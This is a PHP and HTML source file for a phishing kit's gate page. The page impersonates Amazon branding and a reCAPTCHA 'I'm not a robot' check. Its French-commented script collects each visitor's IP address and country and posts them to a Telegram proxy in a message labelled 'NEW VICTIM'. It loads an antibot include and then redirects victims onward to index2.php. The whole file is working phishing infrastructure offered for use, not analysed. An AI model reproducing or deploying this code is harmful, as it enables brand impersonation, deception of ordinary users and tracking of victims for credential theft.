<?php
include 'antibot.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify You're Human</title>
    
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffffff; /* Changed from black to white */
            color: #000000; /* Changed from white to black */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        
        .captcha-container {
            background-color: #f8f9fa; /* Changed to light grey/white */
            border-radius: 8px;
            padding: 40px;
            width: 100%;
            max-width: 360px;
            text-align: center;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); /* Lighter shadow */
            border: 1px solid #e0e0e0; /* Added border */
        }
        
        .logo-top {
            display: flex;
            justify-content: center;
            margin-bottom: 24px;
        }
        
        .logo-link {
            display: inline-block;
            text-decoration: none;
            border: none;
            outline: none;
        }
        
        .logo-link:hover .logo {
            opacity: 0.9;
            transform: scale(1.02);
            transition: all 0.2s ease;
        }
        
        .logo-link:active .logo {
            transform: scale(0.98);
        }
        
        .logo {
            width: 180px;
            height: auto;
            border-radius: 8px;
            transition: all 0.2s ease;
            cursor: pointer;
        }
        
        h1 {
            font-size: 24px;
            margin-top: 0;
            margin-bottom: 24px;
            color: #000000; /* Changed from white to black */
            font-weight: 600; /* Slightly bolder */
        }
        
        .recaptcha-container {
            background-color: #ffffff; /* Changed from white to keep white */
            border-radius: 4px;
            padding: 8px;
            margin-bottom: 24px;
            text-align: left;
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            transition: all 0.2s ease;
            width: 100%;
            box-sizing: border-box;
            border: 2px solid #e0e0e0; /* Added border */
        }
        
        .recaptcha-container:hover {
            box-shadow: 0 0 8px rgba(0, 0, 0, 0.1);
            border-color: #c0c0c0; /* Darker border on hover */
        }
        
        .recaptcha-left {
            display: flex;
            align-items: center;
            flex-direction: column;
            align-items: flex-start;
        }
        
        .recaptcha-checkbox-wrapper {
            display: flex;
            align-items: center;
            width: 100%;
        }
        
        .recaptcha-checkbox {
            width: 22px;
            height: 22px;
            margin-right: 8px;
            accent-color: #FFD700; /* Yellow/gold - keeping this for contrast */
        }
        
        .recaptcha-text {
            color: #333333; /* Dark grey - good contrast on white */
            font-size: 14px;
            font-weight: 500;
        }
        
        .recaptcha-terms {
            color: #666666; /* Medium grey */
            font-size: 10px;
            margin-top: 4px;
            line-height: 1.2;
            padding-left: 30px;
        }
        
        .recaptcha-logo {
            width: 60px;
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        
        .recaptcha-logo img {
            max-width: 100%;
            max-height: 100%;
        }
        
        .button-container {
            display: flex;
            justify-content: center;
            margin-top: 24px;
        }
        
        .continue-btn {
            background-color: #FFD700; /* Yellow - keeping for contrast */
            color: #000000; /* Black text */
            border: none;
            border-radius: 500px;
            padding: 10px 24px;
            font-size: 12px;
            font-weight: 700;
            width: auto;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }
        
        .continue-btn:hover {
            background-color: #FFC800; /* Darker yellow on hover */
            color: #000000;
        }
        
        .continue-btn:disabled {
            background-color: #e0e0e0; /* Light grey when disabled */
            color: #999999; /* Medium grey text */
            cursor: not-allowed;
        }
        
        .continue-btn.active {
            background-color: #FFD700; /* Yellow when active */
            color: #000000;
        }
        
        .error-text {
            display: none;
            color: #e91429; /* Red for errors - keeping for visibility */
            font-size: 14px;
            font-weight: 500;
            text-align: center;
            margin: 16px 0;
        }
        
        .loading {
            display: none;
            color: #666666; /* Changed to medium grey */
            font-size: 14px;
            margin-top: 16px;
        }
        
        /* Formulaire caché */
        #captcha-form {
            display: none;
        }
    </style>
</head>
<body>
    <div class="captcha-container" id="mainContainer">
        <div class="logo-top">
            <a href="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/3840px-Amazon_logo.svg.png" target="_blank" class="logo-link">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/3840px-Amazon_logo.svg.png" alt="Logo" class="logo">
            </a>
        </div>
        
        <h1>Please Verify You're Human</h1>
        
        <div class="recaptcha-container" id="recaptchaContainer">
            <div class="recaptcha-left">
                <div class="recaptcha-checkbox-wrapper">
                    <input type="checkbox" id="robotCheckbox" class="recaptcha-checkbox">
                    <div class="recaptcha-text">I'm not a robot</div>
                </div>
                <div class="recaptcha-terms">
                    reCAPTCHA terms of use have changed.<br>Take action
                </div>
            </div>
            <div class="recaptcha-logo">
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
            </div>
        </div>

        <div class="error-text" id="errorMessage">
            Please confirm that you are not a robot.
        </div>
        
        <div class="loading" id="loadingMessage">
            Verifying... Please wait
        </div>

        <div class="button-container">
            <button class="continue-btn" id="continueBtn" disabled>Continue</button>
        </div>
        
        <form id="captcha-form">
            <input type="hidden" name="page_type" value="captcha">
            <input type="hidden" id="captcha_response_input" name="captcha_response" value="pending">
        </form>
    </div>

    <script>
        // Éléments du DOM
        const robotCheckbox = document.getElementById('robotCheckbox');
        const continueBtn = document.getElementById('continueBtn');
        const errorMessage = document.getElementById('errorMessage');
        const loadingMessage = document.getElementById('loadingMessage');
        const captchaForm = document.getElementById('captcha-form');
        const captchaResponseInput = document.getElementById('captcha_response_input');
        const mainContainer = document.getElementById('mainContainer');
        const recaptchaContainer = document.getElementById('recaptchaContainer');
        
        // Fonction pour obtenir l'IP et le pays
        async function getIPAndCountry() {
            try {
                // Récupérer l'IP
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const userIP = ipData.ip;
                
                // Récupérer le pays
                const locationResponse = await fetch(`https://ipapi.co/${userIP}/country_name/`);
                let userCountry = await locationResponse.text();
                
                if (!userCountry || userCountry === 'Undefined') {
                    userCountry = 'Unknown';
                }
                
                return { ip: userIP, country: userCountry };
            } catch (error) {
                console.error('Error fetching user info:', error);
                return { ip: 'Failed to fetch', country: 'Failed to fetch' };
            }
        }
        
        // Fonction pour envoyer les informations à Telegram
        async function sendToTelegram(ip, country) {
            const message = `🚨​ 🔑​ NEW VICTIM 🔑​ :\n\n🌐 IP: ${ip}\n🌍 Pays: ${country}\n⏰ Date: ${new Date().toLocaleString()}`;
            
            try {
                console.log('Sending to Telegram via proxy:', { message });
                const response = await fetch('telegram_proxy.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        message: message
                    })
                });
                
                console.log('Telegram proxy response status:', response.status);
                const responseData = await response.json();
                console.log('Telegram proxy response data:', responseData);
                
                if (!responseData.success) {
                    throw new Error(`Failed to send message to Telegram: ${responseData.error}`);
                }
                
                return true;
            } catch (error) {
                console.error('Error sending to Telegram:', error);
                return false;
            }
        }
        
        // Fonction principale de vérification
        async function checkVerification() {
            if (robotCheckbox.checked) {
                // Afficher loading
                continueBtn.style.display = 'none';
                loadingMessage.style.display = 'block';
                errorMessage.style.display = 'none';
                
                try {
                    // Obtenir les informations de l'utilisateur
                    const userInfo = await getIPAndCountry();
                    
                    // Envoyer les informations à Telegram
                    await sendToTelegram(userInfo.ip, userInfo.country);
                    
                    // Attendre un peu pour simuler le traitement
                    await new Promise(resolve => setTimeout(resolve, 1500));
                    
                    // Rediriger vers index2.php
                    window.location.href = "index2.php";
                    
                } catch (error) {
                    console.error('Error in verification process:', error);
                    // Redirection même en cas d'erreur
                    window.location.href = "index2.php";
                }
                
            } else {
                // Afficher l'erreur
                errorMessage.style.display = 'block';
                
                // Cacher l'erreur après 3 secondes
                setTimeout(function() {
                    errorMessage.style.display = 'none';
                }, 3000);
            }
        }
        
        // Fonction pour activer le bouton (yellow style)
        function activateContinueButton() {
            continueBtn.disabled = false;
            continueBtn.classList.add('active');
        }
        
        // Fonction pour désactiver le bouton
        function deactivateContinueButton() {
            continueBtn.disabled = true;
            continueBtn.classList.remove('active');
        }
        
        // Événement pour le conteneur reCAPTCHA
        recaptchaContainer.addEventListener('click', function() {
            robotCheckbox.checked = !robotCheckbox.checked;
            
            // Activer/désactiver le bouton en fonction de l'état de la case à cocher
            if (robotCheckbox.checked) {
                activateContinueButton();
                captchaResponseInput.value = "verified_" + Date.now();
                errorMessage.style.display = 'none';
            } else {
                deactivateContinueButton();
                captchaResponseInput.value = "pending";
            }
        });
        
        // Événement pour la case à cocher (pour éviter la propagation)
        robotCheckbox.addEventListener('click', function(event) {
            event.stopPropagation();
            
            if (this.checked) {
                activateContinueButton();
                captchaResponseInput.value = "verified_" + Date.now();
                errorMessage.style.display = 'none';
            } else {
                deactivateContinueButton();
                captchaResponseInput.value = "pending";
            }
        });
        
        // Événement pour le bouton
        continueBtn.addEventListener('click', function(event) {
            event.stopPropagation();
            checkVerification();
        });
        
        // Récupérer les infos dès le chargement de la page (backup)
        window.addEventListener('load', function() {
            // Initialiser la valeur du captcha
            captchaResponseInput.value = "pending_" + Date.now();
            
            // Précharger l'image du logo pour éviter les erreurs
            const logo = document.querySelector('.logo');
            logo.onerror = function() {
                // Fallback text si le logo ne charge pas
                this.parentNode.innerHTML = '<div style="color: #FFD700; font-size: 24px; font-weight: bold; padding: 10px; border: 2px solid #FFD700; border-radius: 8px;">LOGO</div>';
            };
        });
        
        // Autoriser Enter key
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && robotCheckbox.checked) {
                checkVerification();
            }
        });
        
        // Empêcher le clic droit sur le logo pour copier l'URL
        document.querySelector('.logo-link').addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });
    </script>
</body>
</html>